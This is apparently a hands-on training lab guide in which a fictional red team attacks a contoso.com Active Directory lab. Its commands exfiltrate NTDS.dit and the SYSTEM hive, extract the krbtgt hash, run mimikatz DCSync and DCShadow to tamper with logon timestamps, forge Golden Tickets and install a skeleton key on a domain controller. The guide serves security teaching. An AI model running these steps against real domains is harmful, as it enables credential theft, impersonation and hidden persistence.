![image](.\IMG\MSCyberCoursesResized.png)

# Threats targeting the hybrid & cloud identity platform

## Overview

Contoso is a big name and cannot risk being on the front page of all newspapers because of those stupid ransomware attacks that could have been easily prevented.
Thus, they have decided to create a strong security team. The two new employees <font style="color:red;">**Miss Red**</font> and <font style="color:blue;">**Mister Blue**</font> to respectively take care of the Red and Blue team.
The objective for the Miss Red will be to test and detect vulnerable configuration and uncover unsecure practices. The objective for Mr Blue will be to implement proper monitoring and defense mitigations against the attacks detected by the red team. 

===
# Persistence and domination
All Exercises and tasks must be done in the defined order. They build on each other, if you skip a step, you will no longer be able to continue.

In this lab, your role will alternate between a member of the <font style="color:red;">**Red Team**</font> and a member of the <font style="color:blue;">**Blue Team**</font>. This way you will be able to see what an attacker sees as well as how to configure the environment to mitigate the attacks.

This lab will focus on common post exploitation techniques against on-premises accounts and see what are the trace it leaves behind. 

You mainly use two accounts:

|Red Team|Blue Team|
|:--------:|:--------:|
|Miss Red|Mister Blue|
|CONTOSO\red|CONTOSO\blue|

<font style="color:red;">**CONTOSO\red**</font> is only a user of **CONTOSO\Domain Users** and does not have any privilege on the domain. However, she is a member of the local **Administrators** group on **CLI01**.

<font style="color:blue;">**CONTOSO\blue**</font> is a domain privileged account member of the **Domain Admins** group.


Also, at this point of the lab. The <font style="color:red;">**Red Team**</font> has compromised a few domain admin accounts that you are going to use in the exercises. 

Keep in mind that everything we are going to do here is possible because it's already **GAME OVER**. The attackers already have full access to the environment.

====

## Exercise 1 - Exfiltrate the database
We are still working on the same contoso.com environment composed of the following machines:
- **DC01** a domain controller for contoso.com running Windows Server 2016 in the HQ Active Directory site
- **DC02** a domain controller for contoso.com running Windows Server 2022 in the Beijin Active Directory site
- **SRV01** a domain joined server member of the contoso.com domain running Windows Server 2022
- **CLI01** a domain joined client member of the contoso.com domain running Windows 11

In this exercise, <font style="color:red;">**Miss Red**</font> you will use the credentials you previously compromised to exfiltrate the NTDS database with the intent to crack it offline later...
The account you have full access to is **CONTOSO\katrina.mendoza.adm**. 

### Task 1 - Copy the database using Volume Shadow Copy

1. [] Log on to **@lab.VirtualMachine(CLI01).SelectLink**. Use the following credentials:
    |||
    |:--------|:--------|
    | Username | `CONTOSO\red` |
    | Password | Please type the password |

1. [] Right click on the Start menu ![image](.\IMG\11menu.png) and click on **Windows Terminal (Admin)**.

1. [] In the **Windows Terminal** window, run the following: `runas /user:CONTOSO\katrina.mendoza.adm cmd.exe` and use the following password `NeverTrustAny1!`.

1. [] A new command prompt should have popped up called **cmd.exe (running as CONTOSO\katrina.mendoza.adm)**. To make it easier to keep track, we'll rename the window and change the color. Run the following in that prompt `title Katrina's console & color 4F`

    ![image](.\IMG\K1.png)

    📝 What would be the command to type if you wanted the prompt to be with a light blue background and with a green text? 

    Let's try to copy the database!

1. [] In the red prompt, type the following `copy \\DC01.contoso.com\C$\Windows\NTDS\ntds.dit C:\Users\Public`

    📝 What is the full error message?

1. [] In the same prompt, run the following `wmic /node:DC01.contoso.com process call create "cmd /c vssadmin create shadow /for=C: 2>&1 > C:\output.txt"`
    You will see the following output:
    ![image](.\IMG\WMIC1.png)

    What you have done is asking the Volume Shadow Copy service of Windows to create a snapshot of the drive where the database lies. You can't touch the live file, it's in used. But you can you copy its snapshot version. Its "shadow" version.
    
    Let see where the shadow is...

1. [] Now run the following `type \\DC01.contoso.com\C$\output.txt` and note where the shadow copy of the C drive is located.
![image](.\IMG\Shadow1.png)

1. [] Still in the red prompt, run `wmic /node:DC01 process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\ 2>&1 > C:\output.txt"`. This will copy the shadow copy to the root level of the C drive.

1. [] Now run the following to check if the copy did work `type \\DC01.contoso.com\C$\output.txt`.

1. [] And finally, in the prompt, type the following `copy \\DC01.contoso.com\C$\ntds.dit C:\Users\Public`

    You now have a copy of the NTDS.dit database. Well, that's not enough. You will need the keys to decrypt the secrets... But eh, not that hard, they are stored on the same machine! There are warmly waiting for you in the SYSTEM hive. Let's get it too.

1. [] In the red prompt, run `wmic /node:DC01 process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\SYSTEM.hive 2>&1 > C:\output.txt"`. 

1. [] And get it back locally by running `copy \\DC01.contoso.com\C$\SYSTEM.hive C:\Users\Public`

    Now you can use other tools to read those files and extract all the juicy keys they contain.
    
### Task 2 - Copy the database using IFM  [optional]

Note that what you've done with VSS is more of proof of concept than an practical way of doing this. When we copy a database in use from the snapshot, the database is not properly clean (neither is the SYSTEM hive).
A smarter way would be to invoke the IFM feature remotely and copy the output of the IFM. Well, let's do that then!

1. [] Still in the red prompt, run `wmic /node:DC01 process call create "ntdsutil \"activate instance ntds\" ifm \"create full C:\IFM\" quit quit 2>&1 > C:\output.txt"`

    This create an IFM copy in the C:\IFM folder. It can take few minutes to be generated.

1. [] Then copy the stuff locally in a new folder. Still in the red prompt, run the following: `mkdir C:\Users\Public\IFM` and copy the IFM from the DC by running `copy "\\DC01.contoso.com\C$\IFM\Active Directory" C:\Users\Public\IFM` then `copy \\DC01.contoso.com\C$\IFM\Registry C:\Users\Public\IFM`

1. [] Switch to the **Terminal console**, the one running with your account (not Katrina's). In the terminal, change the current directly with the command `Set-Location C:\Users\Public\IFM`

1. [] Let see if you can read the database you have. Run the following `Get-ADDBDomainController -DatabasePath NTDS.dit`

    Good! It seems that this is usable. Let's try to read a user account.

    >[!knowledge] This PowerSHell cmdLet is a part of the DSInternal module.

    📝 Is the DS Internal PowerShell module available by default on Windows?

1. [] From the **Terminal console**, run the following: `Get-ADDBAccount -SamAccountName krbtgt -DatabasePath ntds.dit`

    It seems that we can read everything but the secrets... Oh of course, you almost forgot. There are encrypted. So first we get the key and then we extract the secret of the KrbTgt account.
    
1. [] Still in the **Terminal console**, run the following: `$syskey = Get-BootKey -SystemHiveFilePath SYSTEM` then `Get-ADDBAccount -SamAccountName krbtgt -DatabasePath ntds.dit -BootKey $syskey`

    📝 What are the last four characters of the NTHash of the krbtgt account? 

    Now that you have the KrbTgt hash in your possession, well you could impersonate whoever you want!

===

## Exercise 2 - Replicate the database

In this exercise, <font style="color:red;">**Miss Red**</font> you will use the credentials you previously compromised to replicate the database and all its secrets.
The account you have full access to is **CONTOSO\katrina.mendoza.adm**. 

1. [] Log on to **@lab.VirtualMachine(CLI01).SelectLink**. Use the following credentials:
    |||
    |:--------|:--------|
    | Username | `CONTOSO\red` |
    | Password | Please type the password |

1. [] At this point, you should have two windows opened, a Windows Terminal prompt and a red prompt. If you have closed them re-open them by right clicking on the Start menu ![image](.\IMG\11menu.png) and clicking on **Windows Terminal (Admin)**. In the **Windows Terminal** window, run the following: `runas /user:CONTOSO\katrina.mendoza.adm cmd.exe` and use the following password `NeverTrustAny1!`. A new command prompt should have popped up called **cmd.exe (running as CONTOSO\katrina.mendoza.adm)**. To make it easier to keep track, we'll rename the window and change the color. Run the following in that prompt `title Katrina's console & color 4F`.

1. [] In the red prompt, change the current directory `cd \Tools\mimikatz` then execute `mimikatz.exe`. 

1. [] In the **mimikatz 2.2.0 x64 (oe.eo)** prompt, run the following `lsadump::dcsync /domain:contoso.com /user:blue`

    📝 What is the object relative ID listed in the output?

    📝 What is the default salt value for the user?

    Make a note of the NTLM Hash.

1. [] In the **mimikatz 2.2.0 x64 (oe.eo)** prompt, run the following `lsadump::dcsync /domain:contoso.com /user:red`

    📝 Why do the user Red and Blue have the same NT Hash?


That's it. Crazy fast eh? It just takes an account with the right permission to compromise the account of your choice with the DC Sync technique. Of course, like we discussed it in the course, it is quite easy to detect as it is replication traffic on the network going to a machine which is not a DC. But detecting it might be too late...



===

## Exercise 3 - Modify objects using the DC Shadow attack

There is an attribute on user and computer account that you can use to determine when the last time the user was used. This attribute has its own logic of update. It only updates with the current time of logon if the last time it was updated was more than 14 days ago. See the following 🔗[“The LastLogonTimeStamp Attribute” – “What it was designed for and how it works”](https://techcommunity.microsoft.com/t5/ask-the-directory-services-team/8220-the-lastlogontimestamp-attribute-8221-8211-8220-what-it-was/ba-p/396204)

Your goal in this exercise will be to set an arbitrary value for Katrina's account to fool the admin into thinking the account hasn't been used in a while.

1. [] Log on to **@lab.VirtualMachine(CLI01).SelectLink**. Use the following credentials:
    |||
    |:--------|:--------|
    | Username | `CONTOSO\red` |
    | Password | Please type the password |

1. [] At this point, you should have two windows opened, a Windows Terminal prompt and a red prompt. If you have closed them re-open them by right clicking on the Start menu ![image](.\IMG\11menu.png) and clicking on **Windows Terminal (Admin)**. In the **Windows Terminal** window, run the following: `runas /user:CONTOSO\katrina.mendoza.adm cmd.exe` and use the following password `NeverTrustAny1!`. A new command prompt should have popped up called **cmd.exe (running as CONTOSO\katrina.mendoza.adm)**. To make it easier to keep track, we'll rename the window and change the color. Run the following in that prompt `title Katrina's console & color 4F`.

1. [] In the **Terminal console**, make sure the current directory is where Mimikayz is by running `Set-Location \Tools\mimikatz` then run `.\mimikatz.exe`. In the mimikatz prompt, run the following to create a new instance of mimikatz running in the local system security context: `process::runp`.

    At this point you have three prompts.

    **1** The Windows Terminal console

    **2** The red prompt
    
    **3** The mikikatz prompt running as local system (you can easily spot it with its kiwi icon in the system tray ![image](.\IMG\KIWI.png))

1. [] In the mimikatz prompt (with the kiwi icon), run the following: `lsadump::dcshadow /object:katrina.mendoza.adm /attribute:lastLogonTimestamp /value:123567890123456789`

    You might be asked to agree to the following prompt to allow incoming connections to mimikatz.
    ![image](.\IMG\FW.png)
    Click **Allow access**.

    It starts a fake server and is waiting for a legit DC to replicate:
    ![image](.\IMG\WAIT.png)

1. [] Switch to the red prompt, make sure you are in the right directory with `cd \Tools\mimikatz` then execute `mimikatz.exe`. 

1. [] Now to force a legitimate DC to replicate with our fake server, run the following in the red prompt: `lsadump::dcshadow /push`

    Once the replication took place, the fake server will stop by itself:
    ![image](.\IMG\STOP.png)

    Let's check what Katrina's account look like.

1. [] Switch back to the **Terminal console**, if you are still in the mimikatz instance there, run `exit`


    ![image](.\IMG\EXIT.png)

1. [] Now run the following: `Get-ADUser -Identity katrina.mendoza.adm -Properties lastLogonTimeStamp,lastLogonDate -Server DC01.contoso.com `

    📝 When is the "new" last logon date for that account?

    📝 What would be the mimikatz DC Shadow command to set the description attribute of the account with the value "I WAS HERE"?

Here you go. If <font style="color:blue;">**Mister Blue**</font> is doing some reporting on accounts being used recetnly, this one will probably not show up :)

<details><summary>❓ What is the difference between **lastLogonTimestamp** and **LastLogonDate** in the PowerShell output? **Click here to see the answer**.</summary>
**LastLogonDate** is just a parsed version of the **lastLogonTimestamp** attribute. It is not stored as a human "readable" date in AD so **PowerShell** is nice enough to translate that on the fly.
If you want to translate the attribute lastLogonTimestamp manually, you can run the command `w32tm /ntte` followed by the long integer you see for the actual attribute in AD.
</details> 

===

## Exercise 4 - Perform Golden ticket attacks

Hello <font style="color:red;">**Miss Red**</font>. In this exercise you are going to mess with <font style="color:blue;">**Mister Blue**</font> by crafting a TGT for the user and inject it into your own session.
For this you are going to use the domain admin credentials of Katrina that you've previously stolen.


1. [] Log on to **@lab.VirtualMachine(SRV01).SelectLink**. Use the following credentials:
    |||
    |:--------|:--------|
    | Username | `CONTOSO\katrina.mendoza.adm` |
    | Password | Please type the password |
    
1. [] Right click on the Start menu ![image](.\IMG\2022menu.png) and click on **Windows PowerShell (Admin)**.

1. [] In the **Administrator: Windows PowerShell** window run `cmd.exe` and then `title Admin console`. You should see the following:
![image](.\IMG\cmdtitle.png)

1. [] In this renamed console, run the following `cd \Tools\mimikatz\mimikatz` (yes that's twice mimikatz, just because) and then `mimikatz.exe`.

1. [] Run the following to extract the KrbTgt secrets `lsadump::dcsync /user:krbtgt` and explorer the output.

1. [] Now run the following to craft your TGT for <font style="color:blue;">**Mister Blue**</font> : `kerberos::golden /user:blue /domain:contoso.com /sid:S-1-5-21-1335734252-711511382-1358492552 /endin:5241600 /aes256:5d8029df60602bf0820ed46831e6ca4eb2a9767ed9fb4f35a741e1ec8bdb2605 /ptt`

    - **/sid** is the domain sid
    - **/endin** the the validity time for the TGT (normally it is 600 minutes)
    - **/aes256** is the AES256 hash of the KrbTgt account
    - **/ptt** is the Pass The Ticket parameter which means you will inject the crafted ticket in memory, without having to run another command

1. [] You can exit **mimikatz** by running `exit` and then run `klist`. Epxlore the output of the **klist** command.

    📝 How long is your TGT for blue valid for? 

    📝 What parameter should you use to change that validity time?

    Let's put it to the test and access a resource.

1. [] You are still in the **Administrator: Admin console**, run the following `dir \\DC01.contoso.com\C$` and then run `klist`. 

    You should see a new ticket for the **cifs/DC01.contoso.com**. The DC thinks this ticket has been requested by Blue, but in your case, it was requested using your crafted TGT ticket.

    And this will work even if blue changes his password. For as long as your TGT is valid for and as long as the KrbTgt key is still the same.

===

## Exercise 5 - Skeleton key attacks [optional]

In the physical world, a skeleton key is a key designed to fit many locks. In the identity world, a skeleton key is like having a password that works on many accounts on the top of the actual password.

<font style="color:red;">**Miss Red**</font>, in this exercise you are going patch the KDC service on a the domain controller using mimikatz in a way that a skeleton key (or generic password) will always be accepted regardless of the user you try it against.

To make the exercise faster, we've already downloaded mimikatz on the domain controller. In a real attack scenario, the attacker will have to find a way to get the mimikatz stuff onto the DC without being seen.
<!--
Let's pre seen mimikatz on the DC

### Task 1 - Copy mimikatz on the domain controller

Note that to simplify some of the exercises, we have disable Windows Defender protection.

1. [] Log on to **@lab.VirtualMachine(CLI01).SelectLink**. Use the following credentials:
    |||
    |:--------|:--------|
    | Username | `CONTOSO\red` |
    | Password | Please type the password |

1. [] At this point, you should have two windows opened, a Windows Terminal prompt and a red prompt. If you have closed them re-open them by right clicking on the Start menu ![image](.\IMG\11menu.png) and clicking on **Windows Terminal (Admin)**. In the **Windows Terminal** window, run the following: `runas /user:CONTOSO\katrina.mendoza.adm cmd.exe` and use the following password `NeverTrustAny1!`. A new command prompt should have poped up called **cmd.exe (running as CONTOSO\katrina.mendoza.adm)**. To make it easier to keep track, we'll rename the window and change the color. Run the following in that prompt `title Katrina's console & color 4F`.

1. [] In the red prompt, run the following to create a new folder on the DC `mkdir \\DC01.contoso.com\C$\Tools\mimikatz`

1. [] In the same prompt, copy mimikatz to the DC `copy C:\Tools\mimikatz\* \\DC01.contoso.com\C$\Tools\mimikatz`

-->
### Task 1 - Patch the KDC with the skeleton key

Patching the DC means that you will inject your skeleton key in the KDC service's memory.

1. [] Log on to **@lab.VirtualMachine(DC01).SelectLink**. Use the following credentials:
    |||
    |:--------|:--------|
    | Username | `CONTOSO\katrina.mendoza.adm` |
    | Password | Please type the password |
    
1. [] Right click on the Start menu ![image](.\IMG\2022menu.png), click on **Command Prompt (Admin)** and confirm **Yes** in the User Account Control popup if you see any.

1. [] In the command prompt run `cd \Tools\mimikatz` then run `mimikatz.exe`

    The prompt's title should be renamed **mimikatz 2.2.0 x64 (oe.eo)**.

1. [] In the same prompt, run `privilege::debug` and then `misc::skeleton` 

    You should see the following:
    ![image](.\IMG\skel1.png)

    📝 What happens in the prompt if you type the command coffee?

The default skeleton key is **mimikatz**. Now you can log in with any accounts with either their real password or this skeleton key.

### Task 2 - Try the skeleton key

Let's try to log on on SRV01 with <font style="color:blue;">**Mister Blue**</font>'s account but with the skeleton key
1. [] Log on to **@lab.VirtualMachine(SRV01).SelectLink**. Use the following credentials:
    |||
    |:--------|:--------|
    | Username | `CONTOSO\blue` |
    | ⚠️ Password | `mimikatz` |
   
1. [] You should be in using the skeleton key (as long as DC01 was used for the authentication).

    📝 Can you still open a connection with the real user's password?

The mimikatz patch will die at next reboot, but other malware might be using some persistence mechanisms to do the same thing. Pretty scary stuff eh?

===

🍾 Congratulations! You have completed the labs for this chapter.


**Make sure you have noted all the answers to the questions marked with 📝.** 